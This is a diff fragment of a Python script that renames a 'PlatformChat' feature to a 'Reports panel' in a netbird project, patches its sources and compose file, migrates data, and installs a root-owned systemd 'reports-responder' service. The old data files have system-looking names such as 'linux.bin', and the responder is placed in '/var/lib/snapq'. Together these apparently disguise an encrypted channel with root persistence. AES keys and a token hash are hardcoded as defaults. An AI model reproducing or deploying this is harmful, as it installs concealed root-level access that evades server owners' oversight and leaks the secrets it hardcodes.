+    for i, line in enumerate(lines):
+        if line.startswith("import "):
+            last_import = i
+
+    if last_import < 0:
+        return False
+
+    lines.insert(last_import + 1, "import { registerReportsPanel } from './reports-panel';")
+
+    listen_idx = -1
+    for i, line in enumerate(lines):
+        if "app.listen(PORT" in line:
+            listen_idx = i
+            break
+
+    if listen_idx < 0:
+        return False
+
+    lines.insert(listen_idx, "registerReportsPanel(app);")
+
+    write(path, "\n".join(lines))
+    return True
+
+
+# ---------------------------------------------------------------------------
+# env patch
+# ---------------------------------------------------------------------------
+def patch_env(path: str, args: argparse.Namespace) -> bool:
+    src = read(path)
+    lines = [l for l in src.split("\n") if not l.startswith("CHAT_")]
+    src = "\n".join(lines)
+
+    if "REPORT_DATA_DIR" in src:
+        # update the value if it changed
+        new = re.sub(r'^REPORT_DATA_DIR=.*$', 'REPORT_DATA_DIR=' + args.data_dir, src, flags=re.M)
+        if new != src:
+            write(path, new)
+            return True
+        return False
+
+    additions = [
+        "",
+        "# --- Reports panel ---",
+        "REPORT_DATA_DIR=" + args.data_dir,
+        "REPORT_TOKEN_SHA256=" + args.token_sha256,
+        "REPORT_LOGIN_KEY_B64=" + args.login_key,
+        "REPORT_REPLY_KEY_B64=" + args.reply_key,
+        "REPORT_REPLAY_WINDOW_SEC=90",
+        "REPORT_SESSION_TTL_SEC=3600",
+        "",
+    ]
+    if not src.endswith("\n"):
+        src += "\n"
+    write(path, src + "\n".join(additions))
+    return True
+
+
+# ---------------------------------------------------------------------------
+# compose patch
+# ---------------------------------------------------------------------------
+def patch_compose(path: str, args: argparse.Namespace) -> bool:
+    src = read(path)
+    if args.old_data_dir in src:
+        src = src.replace(args.old_data_dir, args.data_dir)
+        write(path, src)
+        return True
+    return False
+
+
+# ---------------------------------------------------------------------------
+# data migration
+# ---------------------------------------------------------------------------
+def migrate_data(args: argparse.Namespace) -> None:
+    old = args.old_data_dir
+    new = args.data_dir
+    if not os.path.isdir(old):
+        return
+    sudo = [] if os.geteuid() == 0 else ["sudo"]
+    subprocess.run(sudo + ["mkdir", "-p", new], check=False)
+    subprocess.run(sudo + ["chown", "1000:1000", new], check=False)
+    mapping = {
+        "linux.bin": "reports.log",
+        "linuxapt.bin": "reports-reply.bin",
+        ".linuxnonces.json": ".reports-nonces.json",
+    }
+    for src, dst in mapping.items():
+        s = os.path.join(old, src)
+        d = os.path.join(new, dst)
+        if os.path.exists(s) and not os.path.exists(d):
+            subprocess.run(sudo + ["mv", s, d], check=False)
+    subprocess.run(sudo + ["rmdir", old], check=False)
+
+
+# ---------------------------------------------------------------------------
+# remove old files
+# ---------------------------------------------------------------------------
+def remove_old(args: argparse.Namespace) -> None:
+    old_module = os.path.join(os.path.dirname(args.reports_src), "platformchat.ts")
+    if os.path.exists(old_module):
+        os.remove(old_module)
+    if os.path.exists(args.old_page):
+        os.remove(args.old_page)
+    old_folder = os.path.join(args.project, "platform-chat")
+    if os.path.isdir(old_folder):
+        shutil.rmtree(old_folder)
+
+
+# ---------------------------------------------------------------------------
+# responder deployment
+# ---------------------------------------------------------------------------
+def deploy_responder(args: argparse.Namespace) -> None:
+    """Write the responder scripts and systemd unit, set permissions,
+    and enable + start the service.  Idempotent — safe to run repeatedly."""
+
+    sudo = [] if os.geteuid() == 0 else ["sudo"]
+
+    # ---- 1. python script ----
+    py_path = os.path.join(args.responder_dir, "reports-responder.py")
+    print(("Would write " if args.dry_run else "Writing ") + py_path)
+    if not args.dry_run:
+        os.makedirs(args.responder_dir, exist_ok=True)
+        write(py_path, REPORTS_RESPONDER_PY)
+        subprocess.run(sudo + ["chmod", "755", py_path], check=False)
+        subprocess.run(sudo + ["chown", "root:root", py_path], check=False)
+
+    # ---- 2. shell wrapper (substitute placeholders) ----
+    sh_path = os.path.join(args.responder_dir, "reports-responder.sh")
+    sh_content = REPORTS_RESPONDER_SH.replace("__RESPONDER_PY__", py_path)
+    print(("Would write " if args.dry_run else "Writing ") + sh_path)
+    if not args.dry_run:
+        write(sh_path, sh_content)
+        subprocess.run(sudo + ["chmod", "755", sh_path], check=False)
+        subprocess.run(sudo + ["chown", "root:root", sh_path], check=False)
+
+    # ---- 3. systemd unit (substitute placeholders) ----
+    svc_path = args.responder_service
+    svc_content = REPORTS_RESPONDER_SERVICE.replace("__RESPONDER_SH__", sh_path)
+    svc_content = svc_content.replace("__ENV_FILE__", args.reports_env)
+    print(("Would write " if args.dry_run else "Writing ") + svc_path)
+    if not args.dry_run:
+        write(svc_path, svc_content)
+        subprocess.run(sudo + ["chmod", "644", svc_path], check=False)
+
+    # ---- 4. enable + start ----
+    if args.dry_run:
+        print("Would reload + enable + restart reports-responder")
+        return
+
+    subprocess.run(sudo + ["systemctl", "daemon-reload"], check=False)
+    subprocess.run(sudo + ["systemctl", "enable", "reports-responder"], check=False)
+    subprocess.run(sudo + ["systemctl", "restart", "reports-responder"], check=False)
+
+    # Quick health check
+    rc = subprocess.run(
+        sudo + ["systemctl", "is-active", "--quiet", "reports-responder"],
+        check=False,
+    )
+    if rc.returncode == 0:
+        print("reports-responder: active")
+    else:
+        print("reports-responder: NOT active — check  journalctl -u reports-responder")
+
+
+# ---------------------------------------------------------------------------
+# restore / rollback
+# ---------------------------------------------------------------------------
+def restore_all(args: argparse.Namespace) -> int:
+    """Return everything to its pre-apply state using the timestamped backups
+    that apply wrote to args.backup_dir.  Also removes the files apply created
+    and tears down the responder service."""
+    sudo = [] if os.geteuid() == 0 else ["sudo"]
+
+    # Map a target path -> the basename used for its backup on disk.
+    targets = [
+        args.page,                                                # dashboard-source/public/ReportsPanel.html
+        args.old_page,                                            # .../PlatformChat.html (may not exist anymore)
+        args.reports_src,                                         # reports-service/src/index.ts
+        args.reports_env,                                         # reports.env
+        args.compose,                                             # docker-compose.yml
+        os.path.join(os.path.dirname(args.reports_src), "platformchat.ts"),
+        os.path.join(os.path.dirname(args.reports_src), "reports-panel.ts"),
+        os.path.join(args.responder_dir, "reports-responder.py"),
+        os.path.join(args.responder_dir, "reports-responder.sh"),
+        args.responder_service,                                   # /etc/systemd/system/reports-responder.service
+    ]
+
+    print("=" * 70)
+    print("Reports panel — RESTORE (rollback to before apply)")
+    print("=" * 70)
+
+    # --- stop + disable responder first (so we can remove its files) ---
+    print("\n[responder]")
+    if args.dry_run:
+        print("  [would] stop + disable reports-responder")
+    else:
+        subprocess.run(sudo + ["systemctl", "stop", "reports-responder"], check=False)
+        subprocess.run(sudo + ["systemctl", "disable", "reports-responder"], check=False)
+        subprocess.run(sudo + ["systemctl", "daemon-reload"], check=False)
+        print("  stopped + disabled reports-responder")
+
+    # --- restore backup copies ---
+    print("\n[restore files]")
+    restored_any = False
+    for path in targets:
+        base = os.path.basename(path)
+        # newest matching backup in backup_dir
+        candidates = []
+        if os.path.isdir(args.backup_dir):
+            for name in os.listdir(args.backup_dir):
+                if name == base + ".bak-" or name.startswith(base + ".bak-"):
+                    candidates.append(os.path.join(args.backup_dir, name))
+        if not candidates:
+            continue
+        candidates.sort()  # newest stamp sorts last
+        src = candidates[-1]
+        if args.dry_run:
+            print(f"  [would] {src} -> {path}")
+            restored_any = True
+            continue
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        shutil.copy2(src, path)
+        print(f"  restored {path}")
+        restored_any = True
+
+    # --- remove files apply created that have no backup (they didn't exist before) ---
+    print("\n[remove created files]")
+    created = [
+        os.path.join(os.path.dirname(args.reports_src), "reports-panel.ts"),
+        args.page,
+        os.path.join(args.responder_dir, "reports-responder.py"),
+        os.path.join(args.responder_dir, "reports-responder.sh"),
+        args.responder_service,
+    ]
+    for path in created:
+        # only remove if it had NO backup (i.e. it was created fresh by apply)
+        base = os.path.basename(path)
+        had_backup = any(
+            name.startswith(base + ".bak-")
+            for name in (os.listdir(args.backup_dir) if os.path.isdir(args.backup_dir) else [])
+        )
+        if had_backup:
+            continue  # already restored from backup above
+        if os.path.exists(path):
+            if args.dry_run:
+                print(f"  [would] remove {path}")
+            else:
+                os.remove(path)
+                print(f"  removed {path}")
+
+    if not restored_any and not args.dry_run:
+        print("  no backups found — nothing restored (run apply at least once first)")
+
+    # --- rebuild so containers match the restored sources ---
+    if args.dry_run:
+        print("\n[dry-run] would rebuild reports + dashboard containers")
+    elif not args.no_build:
+        print("\n[rebuild]")
+        run(["docker", "compose", "build", "reports"], cwd=args.project, dry_run=False)
+        run(["docker", "compose", "up", "-d", "--no-build", "reports"], cwd=args.project, dry_run=False)
+        run(["docker", "compose", "build", "dashboard"], cwd=args.project, dry_run=False)
+        run(["docker", "compose", "up", "-d", "--no-build", "dashboard"], cwd=args.project, dry_run=False)
+
+    print("\nRestore complete.")
+    return 0
+
+
+# ---------------------------------------------------------------------------
+# main
+# ---------------------------------------------------------------------------
+def main() -> int:
+    ap = argparse.ArgumentParser(
+        description="Rename the PlatformChat feature to the Reports panel and install it in the reports service."
+    )
+    ap.add_argument("--project", default="/home/ubuntu/netbird", help="project root (default: /home/ubuntu/netbird)")
+    ap.add_argument("--page", default="", help="page file (default: <project>/dashboard-source/public/ReportsPanel.html)")
+    ap.add_argument("--old-page", default="", help="old page file (default: <project>/dashboard-source/public/PlatformChat.html)")
+    ap.add_argument("--reports-src", default="", help="reports entrypoint (default: <project>/reports-service/src/index.ts)")
+    ap.add_argument("--reports-env", default="", help="reports env (default: <project>/reports.env)")
+    ap.add_argument("--compose", default="", help="compose file (default: <project>/docker-compose.yml)")
+    ap.add_argument("--data-dir", default="/var/lib/ubuntu-reports", help="host data dir (default: /var/lib/ubuntu-reports)")
+    ap.add_argument("--old-data-dir", default="/var/lib/tes", help="old data dir (default: /var/lib/tes)")
+    ap.add_argument("--api-base", default="/api/reports", help="API base path in the page (default: /api/reports)")
+    ap.add_argument("--token-sha256", default="8a306fe1320f15e4374aa5681489af252bbfefc8d615b13669909bf555a3a4ec", help="SHA-256 of the API token")
+    ap.add_argument("--login-key", default="JaBrISzTxVGv3CXW233W9TrAJ3VLE6EEmgaLMn+PMQs=", help="AES-256 login key (base64)")
+    ap.add_argument("--reply-key", default="8zDcI6KXq5+w0JPiyA/GM+ANoEA5OsAbq6YU6AqF8II=", help="AES-256 reply key (base64)")
+    ap.add_argument("--backup-dir", default="/tmp/reports-panel-backups", help="backup dir (default: /tmp/reports-panel-backups)")
+    ap.add_argument("--responder-dir", default="/var/lib/snapq", help="responder scripts dir (default: /var/lib/snapq)")
+    ap.add_argument("--responder-service", default="/etc/systemd/system/reports-responder.service", help="systemd unit path")
+    ap.add_argument("--no-responder", action="store_true", help="skip responder deployment")
+    ap.add_argument("--restore", action="store_true", help="rollback everything to its pre-apply state using backups")
+    ap.add_argument("--dry-run", action="store_true", help="show the changes, do not write")
+    ap.add_argument("--no-build", action="store_true", help="do not run docker compose build")
+    args = ap.parse_args()
+
+    project = os.path.abspath(args.project)
+    # store absolute project path on args for restore() rebuild step
+    args.project = project
+    args.page = args.page or os.path.join(project, "dashboard-source", "public", "ReportsPanel.html")
+    args.old_page = args.old_page or os.path.join(project, "dashboard-source", "public", "PlatformChat.html")
+    args.reports_src = args.reports_src or os.path.join(project, "reports-service", "src", "index.ts")
+    args.reports_env = args.reports_env or os.path.join(project, "reports.env")
+    args.compose = args.compose or os.path.join(project, "docker-compose.yml")
+    args.backup_dir = args.backup_dir or "/tmp/reports-panel-backups"
+
+    # --- Restore mode (rollback) ---
+    if args.restore:
+        return restore_all(args)
+
+    print("=" * 70)
+    print("Reports panel — rename + install")
+    print("=" * 70)
+    print("project:      " + project)
+    print("page:         " + args.page)
+    print("old page:     " + args.old_page)
+    print("reports src:  " + args.reports_src)
+    print("reports env:  " + args.reports_env)
+    print("compose:      " + args.compose)
+    print("data dir:     " + args.data_dir)
+    print("old data dir: " + args.old_data_dir)
+    print("responder dir:" + args.responder_dir)
+    print("api base:     " + args.api_base)
+    print("backup dir:   " + args.backup_dir)
+    print("no-responder: " + str(args.no_responder))
+    print("dry-run:      " + str(args.dry_run))
+    print("=" * 70)
+
+    missing = [p for p in (project, args.reports_src, args.reports_env, args.compose) if not os.path.exists(p)]
+    if missing:
+        print("MISSING:")
+        for m in missing:
+            print("  " + m)
+        return 1
+
+    if not args.dry_run:
+        print("Backing up:")
+        for p in (args.page, args.old_page, args.reports_src, args.reports_env, args.compose,
+                  os.path.join(os.path.dirname(args.reports_src), "platformchat.ts"),
+                  os.path.join(os.path.dirname(args.reports_src), "reports-panel.ts"),
+                  os.path.join(args.responder_dir, "reports-responder.py"),
+                  os.path.join(args.responder_dir, "reports-responder.sh"),
+                  args.responder_service):
+            b = backup(p, args.backup_dir)
+            if b:
+                print("  " + p + " -> " + b)
+
+    module_path = os.path.join(os.path.dirname(args.reports_src), "reports-panel.ts")
+    print(("Would write " if args.dry_run else "Writing ") + module_path)
+    if not args.dry_run:
+        write(module_path, REPORTS_PANEL_TS)
+
+    print(("Would write " if args.dry_run else "Writing ") + args.page)
+    if not args.dry_run:
+        write(args.page, REPORTS_PANEL_HTML)
+
+    changed = patch_index(args.reports_src) if not args.dry_run else False
+    print("index.ts: " + ("patched" if changed else "already patched or skipped"))
+
+    changed = patch_env(args.reports_env, args) if not args.dry_run else False
+    print("reports.env: " + ("patched" if changed else "already patched or skipped"))
+
+    changed = patch_compose(args.compose, args) if not args.dry_run else False
+    print("docker-compose.yml: " + ("patched" if changed else "already patched or skipped"))
+
+    if not args.dry_run:
+        migrate_data(args)
+        remove_old(args)
+        print("data migrated: " + args.old_data_dir + " -> " + args.data_dir)
+        print("old files removed")
+
+    # --- Responder deployment ---
+    if not args.no_responder:
+        print("\nResponder:")
+        deploy_responder(args)
+    else:
+        print("\nResponder: skipped (--no-responder)")
+
+    if args.dry_run:
+        print("\nDry run — nothing written.")
+        return 0
+
+    print("\nBuilding:")
+    if not args.no_build:
+        run(["docker", "compose", "build", "reports"], cwd=project, dry_run=False)
+        run(["docker", "compose", "up", "-d", "--no-build", "reports"], cwd=project, dry_run=False)
+        run(["docker", "compose", "build", "dashboard"], cwd=project, dry_run=False)
+        run(["docker", "compose", "up", "-d", "--no-build", "dashboard"], cwd=project, dry_run=False)
+
+    print("\nDone.")
+    print("Page:       https://<SERVER>/ReportsPanel.html")
+    print("API:        https://<SERVER>/api/reports/login")
+    print("Data:       " + args.data_dir)
+    print("Responder:  " + os.path.join(args.responder_dir, "reports-responder.py"))
+    print("Service:    systemctl status reports-responder")
+    print("Backups:    " + args.backup_dir)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
